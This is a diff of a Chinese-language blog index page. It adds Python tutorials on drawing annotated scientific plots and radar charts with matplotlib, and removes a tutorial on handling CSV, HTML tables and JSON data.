+<h2 id="实例：科学坐标图绘制"><a href="#实例：科学坐标图绘制" class="headerlink" title="实例：科学坐标图绘制"></a>实例：科学坐标图绘制</h2><p>（1）科学坐标图有4个要素：<strong>坐标轴、数据曲线、标题和图注</strong>。本实例以阻尼衰减曲线绘制来具体阐述科学坐标系的绘制方法。</p>
+<p>（2）本实例同时展示了在同一个区域用不同颜色和线条绘制两种曲线的方法，两条曲线分别为(x,y)和(x,z)。</p>
+<pre><code class="python">x = np.linspace(0.0, 6.0, 100)
+y = np.cos(2*np.pi*x) * np.exp(-x)+0.8
+z = 0.5 * np.cos(x ** 2)+0.8</code></pre>
+<pre><code class="python">import numpy as np
+import matplotlib.pyplot as plt
+import matplotlib
+matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
+matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]
+def Draw(pcolor, nt_point, nt_text, nt_size):   #Draw()函数用于绘制曲线
+    plt.plot(x,y,&#39;k&#39;,label=&quot;$exp_decay$&quot;,color=pcolor,\  #根据x、y数组绘制直、曲线
+             linewidth=3, linestyle=&#39;-&#39;)
+    plt.plot(x,z,&quot;b--&quot;,label=&quot;$cos(x^2)$&quot;, linewidth=1)
+    plt.xlabel(&#39;时间(s)&#39;)
+    plt.ylabel(&#39;幅度(mV)&#39;)
+    plt.title(&#39;阻尼衰减曲线绘制&#39;)
+    plt.annotate(&#39;$\cos(2 \pi t) \exp(-t)$&#39;,xy=nt_point,\   #用箭头在指定数据点创建一个注释或一段文本
+                 xytext=nt_text,fontsize=nt_size,arrowprops= \
+                 dict(arrowstyle=&#39;-&gt;&#39;, connectionstyle=&quot;arc3,rad=.1&quot;))
+def Shadow(a,b):                             #Shadow()函数用于设置阴影
+    ix = (x&gt;a) &amp; (x&lt;b)
+    plt.fill_between(x,y,0,where=ix,facecolor=&#39;gray&#39;,alpha=0.25)
+    plt.text(0.5*(a+b),0.2,r&quot;$\int_a^b f(x)\mathrm&#123;d&#125;x$&quot;,\
+             horizontalalignment=&#39;center&#39;)
+def XY_Axis(x_start, x_end, y_start, y_end): #XY_Axis()函数用于修改坐标轴
+    plt.xlim(x_start,x_end)   #设置当前x轴的取值范围
+    plt.ylim(y_start,y_end)
+    plt.xticks([np.pi/3,2 * np.pi/3, 1*np.pi, 4*np.pi/3,\     #设置当前x轴刻度位置的标签和值
+                5*np.pi/3],[&#39;$\pi/3$&#39;,&#39;$2\pi/3$&#39;,&#39;$\pi$&#39;,&#39;$4\pi/3$&#39;,&#39;$5\pi/3$&#39;])
+x = np.linspace(0.0, 6.0, 100)      #创建一个由0.0到6.0，等分成100个元素的数组
+y = np.cos(2 * np.pi * x) * np.exp(-x)+0.8
+z = 0.5 * np.cos(x ** 2)+0.8
+note_point,note_text,note_size=(1,np.cos(2*np.pi)*\
+                                np.exp(-1)+0.8),(1,1.4), 14
+fig = plt.figure(figsize=(8, 6),facecolor=&quot;white&quot;)   #创建一个全局绘图区域
+plt.subplot(111)                                     #在全局绘图区域中创建一个子绘图区域
+Draw(&quot;red&quot;,note_point,note_text,note_size)
+XY_Axis(0,5,0,1.8)
+Shadow(0.8,3)
+plt.legend()               #为当前坐标图放置图注
+plt.savefig(&#39;sample.JPG&#39;)  #将产生的坐标图保存为文件
+plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/yhvMBaQ2HW8e7PU.png" alt="image-20210417190906901"></p>
+<p>（3）其中第13行的annotate()函数配合箭头在曲线绘图界面添加动态注释，箭头的线条和尖端都有多种样式和参数，可以通过arrowprops和connetionstyle选择，具体可参考官方文档。</p>
+<h2 id="实例：多级雷达图绘制"><a href="#实例：多级雷达图绘制" class="headerlink" title="实例：多级雷达图绘制"></a>实例：多级雷达图绘制</h2><h3 id="单一数据雷达图"><a href="#单一数据雷达图" class="headerlink" title="单一数据雷达图"></a>单一数据雷达图</h3><p>（1）雷达图是通过多个离散属性比较对象的最直观工具。</p>
+<pre><code class="python">import numpy as np
+import matplotlib.pyplot as plt
+import matplotlib
+matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;       #第3行到第5用于支持中文
+matplotlib.rcParams[&#39;font.sans-serif&#39;]=[&#39;SimHei&#39;]
+labels = np.array([&#39;综合&#39;,&#39;KDA&#39;,&#39;发育&#39;,&#39;推进&#39;,&#39;生存&#39;,&#39;输出&#39;]) #设置属性标签，包含6个属性
+nAttr = 6
+data = np.array([7, 5, 6, 9, 8, 7]) #预设一组玩家数据值
+angles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)
+data = np.concatenate((data, [data[0]]))    #对data进行封闭
+angles = np.concatenate((angles, [angles[0]]))   #对angles进行封闭
+labels=np.concatenate((labels,[labels[0]]))    #对labels进行封闭，若不对此进行封闭则会报错
+fig = plt.figure(facecolor=&quot;white&quot;)
+plt.subplot(111, polar=True)     #在全局绘图区域中创建一个子绘图区域
+plt.plot(angles,data,&#39;bo-&#39;,color = &#39;g&#39;,linewidth=2)
+plt.fill(angles,data,facecolor=&#39;g&#39;,alpha=0.25)
+plt.thetagrids(angles*180/np.pi,labels)
+plt.figtext(0.52, 0.95, &#39;DOTA能力值雷达图&#39;,ha=&#39;center&#39;)    #为全局绘图区域添加文字
+plt.grid(True)
+plt.savefig(&#39;dota_radar.JPG&#39;)
+plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/17/zpKIPkvLClZGeT8.png" alt="image-20210417215652944"></p>
+<p>（2）np.linspace()函数设定起点为0、末值为2π、返回一个两端点间数值平均分布的长为nAttr的数组angles，<strong>它表示从一个属性点到下一个属性点笔画需要旋转的角</strong>度，它取决于属性<strong>nAttr的大小，也是雷达图的多边形边数。</strong></p>
+<p>（3）np.concatenate()函数用于将数据和角度的数组首尾闭合起来，便于调用plot()函数绘制。</p>
+<p>（4）建立基本绘图对象后，使用subplot()函数建立极坐标系的子分区。<strong>polar参数指定了绘制类型为极坐标</strong>，这是subplot()除默认正方形坐标系外唯一支持的内置坐标图。</p>
+<p>（5）建立极坐标后，使用plot()函数依照data提供的数据画出不规则六边形，然后使用fill()函数填充半透明颜色。</p>
+<p>（6）thetagrids()函数为极坐标设置标签，这里把标签放在六角形的顶点上，需要将角度数据和文字一起作为参数传给thetagrids函数。</p>
+<h3 id="多数据雷达图"><a href="#多数据雷达图" class="headerlink" title="多数据雷达图"></a>多数据雷达图</h3><p><strong>霍兰德人格分析雷达图</strong></p>
+<pre><code class="python">import numpy as np
+import matplotlib.pyplot as plt
+import matplotlib
+matplotlib.rcParams[&#39;font.family&#39;]=&#39;SimHei&#39;
+matplotlib.rcParams[&#39;font.sans-serif&#39;] = [&#39;SimHei&#39;]
+radar_labels = np.array([&#39;研究型(I)&#39;,&#39;艺术型(A)&#39;,&#39;社会型(S)&#39;,\
+                         &#39;企业型(E)&#39;,&#39;常规型(C)&#39;,&#39;现实型(R)&#39;])
+
+nAttr = 6
+data = np.array([[0.40, 0.32, 0.35, 0.30, 0.30, 0.88],
+                 [0.85, 0.35, 0.30, 0.40, 0.40, 0.30],
+                 [0.43, 0.89, 0.30, 0.28, 0.22, 0.30],
+                 [0.30, 0.25, 0.48, 0.85, 0.45, 0.40],
+                 [0.20, 0.38, 0.87, 0.45, 0.32, 0.28],
+                 [0.34, 0.31, 0.38, 0.40, 0.92, 0.28]]) #数据值
+data_labels=(&#39;工程师&#39;,&#39;实验员&#39;,&#39;艺术家&#39;,&#39;推销员&#39;,&#39;社会工作者&#39;,&#39;记事员&#39;)
+angles = np.linspace(0, 2*np.pi, nAttr, endpoint=False)
+data = np.concatenate((data,[data[0]]))
+angles = np.concatenate((angles,[angles[0]]))
+radar_labels = np.concatenate((radar_labels,[radar_labels[0]]))
+fig = plt.figure(facecolor=&quot;white&quot;)
+plt.subplot(111,polar=True)
+#plt.plot(angles,data,&#39;bo-&#39;, color=&#39;gray&#39;,linewidth=1,alpha=0.2)
+
+plt.plot(angles,data,&#39;o-&#39;,linewidth=1.5,alpha=0.2)
+plt.fill(angles,data,alpha=0.25)
+plt.thetagrids(angles*180/np.pi, radar_labels)
+plt.figtext(0.52,0.95,&#39;霍兰德人格分析&#39;, ha=&#39;center&#39;, size=20)
+legend=plt.legend(data_labels,loc=(0.94,0.80),labelspacing=0.1) #为当前坐标图放置图注
+plt.setp(legend.get_texts(),fontsize=&#39;small&#39;)
+plt.grid(True)
+plt.savefig(&#39;holland_radar.JPG&#39;)
+plt.show()</code></pre>
+<p><img src="https://i.loli.net/2021/04/18/apjLAPcXIixFnqy.png" alt="image-20210418141558700"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/04/16/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E5%9B%9B)-%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97%E5%92%8C%E5%8F%AF%E8%A7%86%E5%8C%9602/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Python/运用Python语言(三)-科学计算和可视化01" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -539,7 +1775,7 @@ array([ True, False])</code></pre>
 <ul>
 <li>Gray=R<em>0.3+G\</em>0.59+B*0.11</li>
 </ul>
-<h3 id="图形的手绘效果"><a href="#图形的手绘效果" class="headerlink" title="图形的手绘效果"></a>图形的手绘效果</h3><p>（1）获得铅笔画风格图像常采用ImageFilter.CONTOUR滤镜，它能够将图像的轮廓信息提取出来，但却缺乏立体感。可由程序给出图像的手绘效果，让图像更具立体感。</p>
+<h3 id="图像的手绘效果-1"><a href="#图像的手绘效果-1" class="headerlink" title="图像的手绘效果"></a>图像的手绘效果</h3><p>（1）获得铅笔画风格图像常采用ImageFilter.CONTOUR滤镜，它能够将图像的轮廓信息提取出来，但却缺乏立体感。可由程序给出图像的手绘效果，让图像更具立体感。</p>
 <ul>
 <li>图像轮廓</li>
 </ul>
@@ -1682,1509 +2918,6 @@ nameserver 8.8.8.8</code></pre>
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/04/05/deepin/deepin%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Python/深入Python语言(十)-文件和数据格式化02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/05/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%8D%81)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9602/">深入Python语言(十)-文件和数据格式化02</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/05/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%8D%81)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9602/" class="archive-article-date">
-  	<time datetime="2021-04-05T04:19:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="一二维数据的格式化和处理"><a href="#一二维数据的格式化和处理" class="headerlink" title="一二维数据的格式化和处理"></a>一二维数据的格式化和处理</h2><p><strong>数据组织存在维度，列表类型用于表示和处理一维和二维数据</strong></p>
-<h3 id="数据组织的维度"><a href="#数据组织的维度" class="headerlink" title="数据组织的维度"></a>数据组织的维度</h3><p>（1）一维数据由对等关系的有序或无序数据构成，采用线性方式组织，对应于数学中的数组和集合等概念。</p>
-<p>（2）二维数据，也称为表格数据，由关联关系数据构成，采用表格方式组织，对应于数学中的矩阵，常见的表格都属于二维数据。</p>
-<p>（3）高维数据由键值对类型的数据构成，采用对象方式组织，属于整合度更好的数据组织方式。HTML、XML、JSON等都是高维数据组织的语法结构。</p>
-<p>（4）数据包括文件存储和程序使用两个状态。存储不同维度的数据需要适合维度特点的文件存储格式，处理不同维度数据的程序需要使用相适应的数据类型或结构。<strong>对于数据处理，需要考虑存储格式以及表示和读写等两个问题。</strong></p>
-<h3 id="一二维数据的存储格式"><a href="#一二维数据的存储格式" class="headerlink" title="一二维数据的存储格式"></a>一二维数据的存储格式</h3><p>（1）一维数据是最简单的数据组织类型，有多种存储格式，常用特殊字符分隔，分隔方式如下：</p>
-<ul>
-<li>用一个或多个空格分隔，例如：</li>
-</ul>
-<pre><code>中国  美国  日本  德国  法国  英国  意大利</code></pre>
-<ul>
-<li>用逗号分隔，注意是半角符号</li>
-</ul>
-<pre><code>中国, 美国, 日本, 德国, 法国, 英国, 意大利</code></pre>
-<ul>
-<li>用其他符号或符号组合分隔</li>
-</ul>
-<pre><code>中国; 美国; 日本; 德国; 法国; 英国; 意大利</code></pre>
-<p>（2）二维数据由多条一维数据构成，可以看成是一维数据的组合形式。<strong>一种国际通用的一二维数据存储格式：CSV格式。</strong></p>
-<p>（3）逗号分隔数值的存储格式叫做CSV格式，常应用在程序之间转移表格数据，该格式的一些基本规则如下：</p>
-<ul>
-<li><p>纯文本格式，通过单一编码表示字符</p>
-</li>
-<li><p>以行为单位，开头不留空行，行之间没有空行</p>
-</li>
-<li><p>每行表示一个一维数据，多行表示二维数据</p>
-</li>
-<li><p>以逗号(半角符号)分隔每列数据，列数据为空也要保留逗号</p>
-</li>
-<li><p>对于表格数据，可以包含或不包含表格数据，包含时<strong>列名放置在文件第一行</strong></p>
-<p>例如，二维数据采用CSV存储后的内容如下：</p>
-</li>
-</ul>
-<pre><code>城市,环比,同比,定基          #列名
-北京,101.5,120.7,121.4
-上海,101.2,127.3,127.8
-广州,101.3,119.4,120
-深圳,102,140.9,145.5</code></pre>
-<p>（4）CSV格式存储的文件一般采用.csv为扩展名，可以通过Windows上的记事本或Excel工具打开，也可以在其他操作系统平台上用文本编辑器打开。</p>
-<p>（5）一般的表格数据处理工具(例如Excel)都可以将数据另存为或导出为CSV格式，用于不同工具间进行数据交换。</p>
-<p>扩展：<strong>Python的csv标准库</strong></p>
-<p>Python提供了一个读写csv的标准库，可以通过import csv使用。csv库包含操作CSV格式最基本的功能，csv.reader()和csv.writer()。csv标准库一般应用于运行在复杂环境或商业使用的程序。</p>
-<h3 id="一二维数据的表示和读写"><a href="#一二维数据的表示和读写" class="headerlink" title="一二维数据的表示和读写"></a>一二维数据的表示和读写</h3><p>（1）CSV文件的每一行是一维数据，可以使用列表类型表示。整个CSV文件是一个二维数据，由表示每一行的列表类型作为元素，组成一个<strong>二维列表</strong>。表示如下：</p>
-<pre><code>[
-    [&#39;城市&#39;, &#39;环比&#39;, &#39;同比&#39;, &#39;定基\n&#39;],
-    [&#39;北京&#39;, &#39;101.5&#39;, &#39;120.7&#39;, &#39;121.4\n&#39;],
-    [&#39;上海&#39;, &#39;101.2&#39;, &#39;127.3&#39;, &#39;127.8\n&#39;],
-    [&#39;广州&#39;, &#39;101.3&#39;, &#39;119.4&#39;, &#39;120.0\n&#39;],
-    [&#39;深圳&#39;, &#39;102.0&#39;, &#39;140.9&#39;, &#39;145.5\n&#39;],
-]</code></pre>
-<p>（2）导入CSV格式数据到列表。首先要一个表格，将数据录入，然后保存成price2021.csv文件。</p>
-<p><img src="https://i.loli.net/2021/04/01/yGYlsv9O2uoWEwi.png" alt="image-20210401183648081"></p>
-<pre><code class="python">fo = open(&quot;price2021.csv&quot;,&quot;r&quot;)
-ls = []
-for line in fo:
-    line = line.replace(&quot;\n&quot;,&quot;&quot;)      #将多余的换行符用字符串的replace()方法去掉
-    ls.append(line.split(&quot;,&quot;))
-print(ls)
-fo.close()
-#运行结果
-[[&#39;城市&#39;, &#39;环比&#39;, &#39;同比&#39;, &#39;定基&#39;], [&#39;北京&#39;, &#39;101.5&#39;, &#39;120.7&#39;, &#39;121.4&#39;], [&#39;上海&#39;, &#39;101.2&#39;, &#39;127.3&#39;, &#39;127.8&#39;], [&#39;广州&#39;, &#39;101.3&#39;, &#39;119.4&#39;, &#39;120&#39;], [&#39;深圳&#39;, &#39;102&#39;, &#39;140.9&#39;, &#39;145.5&#39;], [&#39;沈阳&#39;, &#39;100.1&#39;, &#39;101.4&#39;, &#39;101.6&#39;]]</code></pre>
-<p>（3）逐行处理CSV格式数据：从CSV文件中读取数据，去掉内容中的逗号，打印到屏幕。使用price2021.csv文件。</p>
-<pre><code class="python">fo = open(&quot;price2021.csv&quot;, &quot;r&quot;)
-ls = []
-for line in fo:
-    line = line.replace(&quot;\n&quot;,&quot;&quot;)
-    ls = line.split(&quot;,&quot;)
-    lns = &quot;&quot;
-    for s in ls:
-        lns += &quot;&#123;&#125;\t&quot;.format(s)
-    print(lns)
-fo.close()
-
-#运行结果：
-城市    环比    同比    定基
-北京    101.5   120.7   121.4
-上海    101.2   127.3   127.8
-广州    101.3   119.4   120
-深圳    102     140.9   145.5
-沈阳    100.1   101.4   101.6</code></pre>
-<p>（4）对于Python列表变量保存一维数据结果，可以用字符串的join()方法组成逗号分隔形式再通过文件的write()方法存储到CSV文件中。</p>
-<ul>
-<li>一维数据写入CSV文件</li>
-</ul>
-<pre><code class="python">fo = open(&quot;price2021bj.csv&quot;, &quot;w&quot;)
-ls = [&#39;北京&#39;, &#39;101.5&#39;, &#39;120.7&#39;, &#39;121.4&#39;] #要写入的一维数据
-fo.write(&quot;,&quot;.join(ls)+ &quot;\n&quot;)  #其中&quot;,&quot;.join(ls)生成一个新的字符串，它由字符串&quot;,&quot;分隔列表ls中的元素组成
-fo.close()
-
-#运行结果
-北京,101.5,120.7,121.4</code></pre>
-<p>（5）对于列表中存储的二维数据，可以通过循环写入一维数据的方式写入CSV文件，代码样式如下：</p>
-<pre><code class="python">for row in ls:
-    &lt;输出文件&gt;.write(&quot;,&quot;.join(row)+&quot;\n&quot;)</code></pre>
-<ul>
-<li>二维数据写入CSV文件。整个程序分为3部分：<strong>首先将原始文件中的数据全部导入，用列表方式表示</strong>；第二，<strong>对列表的元素逐行判断，对浮点数值进行百分比运算，运算结果写回列表</strong>；第三，<strong>将更新后的列表输出新的CSV文件</strong></li>
-</ul>
-<pre><code class="python">fr = open(&quot;price2021.csv&quot;, &quot;r&quot;)
-fw = open(&quot;price2021out.csv&quot;, &quot;w&quot;)
-ls = []
-for line in fr:      #将CSV文件中的二维数据读入到列表变量
-    line = line.replace(&quot;\n&quot;,&quot;&quot;)
-    ls.append(line.split(&quot;,&quot;))
-for i in range(len(ls)):    #遍历列表变量计算百分数
-    for j in range(len(ls[i])):
-        if ls[i][j].replace(&quot;.&quot;,&quot;&quot;).isnumeric(): 
-            ls[i][j] = &quot;&#123;:.2&#125;%&quot;.format(float(ls[i][j])/100)
-for row in ls:      #将列表变量中的两位数据输出到CSV文件
-    print(row)
-    fw.write(&quot;,&quot;.join(row)+&quot;\n&quot;)
-fr.close()
-fw.close()
-
-#运行结果
-[&#39;城市&#39;, &#39;环比&#39;, &#39;同比&#39;, &#39;定基&#39;]             
-[&#39;北京&#39;, &#39;1.0%&#39;, &#39;1.2%&#39;, &#39;1.2%&#39;]           
-[&#39;上海&#39;, &#39;1.0%&#39;, &#39;1.3%&#39;, &#39;1.3%&#39;]            
-[&#39;广州&#39;, &#39;1.0%&#39;, &#39;1.2%&#39;, &#39;1.2%&#39;]              
-[&#39;深圳&#39;, &#39;1.0%&#39;, &#39;1.4%&#39;, &#39;1.5%&#39;]         
-[&#39;沈阳&#39;, &#39;1.0%&#39;, &#39;1.0%&#39;, &#39;1.0%&#39;]</code></pre>
-<p>（6）上述的第9行代码用于判断一个字符串是否类似”101.5”由数字和小数点组成。由于Python没有单个函数能够直接判断，因此，通过replace()方法将其中可能的小数点去掉，再通过isnumeric()方法判断其余字符是否都是数字。这是一种不完备的判断方式，但在该例中可以使用。</p>
-<h2 id="CSV格式的HTML展示"><a href="#CSV格式的HTML展示" class="headerlink" title="CSV格式的HTML展示"></a>CSV格式的HTML展示</h2><pre><code class="html">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;CSV2HTML&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h2 align=&quot;center&quot;&gt;2016年7月部分大中城市新建住宅价格指数&lt;/h2&gt;
-    &lt;table border=&quot;1&quot; align=&quot;center&quot; width=&quot;70%&quot;&gt;
-        &lt;tr bgcolor=&quot;orange&quot;&gt;
-            &lt;th width=&quot;25%&quot;&gt;城市&lt;/th&gt;
-            &lt;th width=&quot;25%&quot;&gt;环比&lt;/th&gt;
-            &lt;th width=&quot;25%&quot;&gt;同比&lt;/th&gt;
-            &lt;th width=&quot;25%&quot;&gt;定基&lt;/th&gt;
-        &lt;/tr&gt;
-        &lt;tr align=&quot;center&quot;&gt;
-            &lt;td&gt;北京&lt;/td&gt;
-            &lt;td&gt;101.5&lt;/td&gt;
-            &lt;td&gt;120.7&lt;/td&gt;
-            &lt;td&gt;121.4&lt;/td&gt;
-        &lt;/tr&gt;
-        &lt;tr align=&quot;center&quot;&gt;
-            &lt;td&gt;上海&lt;/td&gt;
-            &lt;td&gt;101.2&lt;/td&gt;
-            &lt;td&gt;127.3&lt;/td&gt;
-            &lt;td&gt;127.8&lt;/td&gt;
-        &lt;/tr&gt;
-        &lt;tr align=&quot;center&quot;&gt;
-            &lt;td&gt;广州&lt;/td&gt;
-            &lt;td&gt;101.3&lt;/td&gt;
-            &lt;td&gt;119.4&lt;/td&gt;
-            &lt;td&gt;120.0&lt;/td&gt;
-        &lt;/tr&gt;
-        &lt;tr align=&quot;center&quot;&gt;
-            &lt;td&gt;深圳&lt;/td&gt;
-            &lt;td&gt;102.0&lt;/td&gt;
-            &lt;td&gt;140.9&lt;/td&gt;
-            &lt;td&gt;145.5&lt;/td&gt;
-        &lt;/tr&gt;
-        &lt;tr align=&quot;center&quot;&gt;
-            &lt;td&gt;沈阳&lt;/td&gt;
-            &lt;td&gt;100.1&lt;/td&gt;
-            &lt;td&gt;101.4&lt;/td&gt;
-            &lt;td&gt;101.6&lt;/td&gt;
-        &lt;/tr&gt;
-    &lt;/table&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p><img src="https://i.loli.net/2021/04/01/St9sTude8MIV3bf.png" alt="image-20210401203558060"></p>
-<p>（1）将CSV文件转换成HTML文件分为3个步骤：</p>
-<ul>
-<li>首先，读入CSV文件，获得文件数据</li>
-<li>其次，对数据进行格式处理和转换</li>
-<li>最后，输出与上述代码相同的HTML格式文件</li>
-</ul>
-<pre><code class="python">seg1 = &#39;&#39;&#39;
-&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n&lt;meta charset=utf-8&gt;
-&lt;h2 align=&quot;center&quot;&gt;2016年7月部分大中城市新建住宅价格指数&lt;/h2&gt;
-&lt;table border=&quot;1&quot; align=&quot;center&quot; width=&quot;70%&quot;&gt;
-&lt;tr bgcolor=&quot;orange&quot;&gt;\n &#39;&#39;&#39;
-seg2 = &quot;&lt;/tr&gt;\n&quot;
-seg3 = &quot;&lt;/table&gt;\n&lt;/body&gt;\n&lt;/html&gt;&quot;
-def fill_data(locls):
-    seg = &#39;&lt;tr&gt;&lt;td align=&quot;center&quot;&gt;&#123;&#125;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;\
-          &#123;&#125;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&#123;&#125;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;\
-          &#123;&#125;&lt;/td&gt;&lt;/tr&gt;\n&#39;.format(*locls)
-    return seg
-fr = open(&quot;price2021.csv&quot;,&quot;r&quot;)
-ls = []
-for line in fr:
-    line = line.replace(&quot;\n&quot;,&quot;&quot;)
-    ls.append(line.split(&quot;,&quot;))
-fr.close()
-fw = open(&quot;price2021.html&quot;,&quot;w&quot;)
-fw.write(seg1)
-fw.write(&#39;&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n\
-&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n\
-&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n\
-&lt;th width=&quot;25%&quot;&gt;&#123;&#125;&lt;/th&gt;\n&#39;.format(*ls[0]))
-fw.write(seg2)
-for i in range(len(ls)-1):
-    fw.write(fill_data(ls[i+1]))
-fw.write(seg3)
-fw.close()</code></pre>
-<p>（2）上述代码将CSV文件中的数据读入到列表ls，然后通过格式化字符串方法将ls中的内容写入HTML文件。</p>
-<h2 id="高维数据的格式化"><a href="#高维数据的格式化" class="headerlink" title="高维数据的格式化"></a>高维数据的格式化</h2><p>（1）高维数据能展示数据间更为复杂的组织关系，表示高维关系不采用任何结构形式，仅采用最基本的二元关系，即<strong>键值对</strong>。</p>
-<p>（2）万维网（WWW）是一个复杂的数据组织体系，它通过HTML方式链接并展示不同类型数据内容，采用<strong>XML或JSON格式表达键值对，形成数据间复杂的结构关系</strong>。万维网是高维数据最成功的典型应用。</p>
-<p>（3）JSON格式可以<strong>对高维数据进行表达和存储。</strong>JSON是一种轻量级的数据交换格式，易于阅读和理解。JSON格式表达键值对&lt;key, value&gt;的基本格式如下：</p>
-<pre><code>&quot;key&quot; : &quot;value&quot;   #键值对都保存在双引号中</code></pre>
-<p>（4）当多个键值对放在一起时，JSON有如下一些约定</p>
-<ul>
-<li>数据保存在键值对中</li>
-<li>键值对之间由逗号分隔</li>
-<li>大括号用于保存键值对数据组成的对象</li>
-<li>方括号用于保存键值对数据组成的数组</li>
-</ul>
-<p>例如：</p>
-<pre><code>&quot;本书作者&quot; : [
-                &#123; &quot;姓氏&quot; : &quot;嵩&quot;,
-                  &quot;名字&quot; : &quot;天&quot;,
-                  &quot;单位&quot; : &quot;北京理工大学  &#125;,
-                &#123; &quot;姓氏&quot; : &quot;礼&quot;
-                  &quot;名字&quot; : &quot;欣&quot;
-                  &quot;单位&quot; : &quot;北京理工大学&quot; &#125;,
-                &#123; &quot;姓氏&quot; : &quot;黄&quot;
-                  &quot;名字&quot; : &quot;天羽&quot;
-                  &quot;单位&quot; : &quot;北京理工大学&quot; &#125;
-            ]</code></pre>
-<p>（5）首先它是一个键值对，由“本书作者”与内容组成；由于存在3个作者，作者之间采用逗号分隔，作者之间是对等关系，形成一个数组，采用方括号分隔；每个作者是一个对象，采用大括号组织，因为对象中包括作者的姓氏、名字和单位，每一项都是一个键值对，对应作者的一个属性。</p>
-<p>（6）采用对象、数组方式组织起来的键值对可以表示任何结构的数据。目前，万维网上使用的高维数据格式主要是JSON和XML，建议采用JSON格式。<strong>格式化高维数据采用Python语言的标准库json。</strong></p>
-<p>扩展：XML</p>
-<ul>
-<li>XML，可扩展标记语言。XML格式需要成对的标签表示键值对。“本书作者”的XML描述如下。</li>
-</ul>
-<pre><code>&lt;本书作者&gt;
-    &lt;姓氏&gt;嵩&lt;/姓氏&gt;&lt;名字&gt;天&lt;/名字&gt;&lt;单位&gt;北京理工大学&lt;/单位&gt;
-    &lt;姓氏&gt;礼&lt;/姓氏&gt;&lt;名字&gt;欣&lt;/名字&gt;&lt;单位&gt;北京理工大学&lt;/单位&gt;
-    &lt;姓氏&gt;黄&lt;/姓氏&gt;&lt;名字&gt;天羽&lt;/名字&gt;&lt;单位&gt;北京理工大学&lt;/单位&gt;
-&lt;/本书作者&gt;</code></pre>
-<ul>
-<li>XML对key值要存储两次（&lt;key&gt;&lt;/key&gt;），而JSON只需要存储一次，且在数据交换时产生更少的网络带宽和存储需求，因此，JSON更为常用。</li>
-</ul>
-<h2 id="json库的使用"><a href="#json库的使用" class="headerlink" title="json库的使用"></a>json库的使用</h2><h3 id="json库概述"><a href="#json库概述" class="headerlink" title="json库概述"></a>json库概述</h3><p>（1）json库是处理JSON格式的Python标准库，一般用于JSON格式和其他类型格式转换，导入方式如下：</p>
-<pre><code class="python">import json</code></pre>
-<p>（2）json库主要包括两类函数：操作类函数和解析类函数。</p>
-<ul>
-<li>操作类函数主要完成外部JSON格式和程序内部数据类型之间的转换功能。</li>
-<li>解析类函数主要用于解析键值对内容。</li>
-</ul>
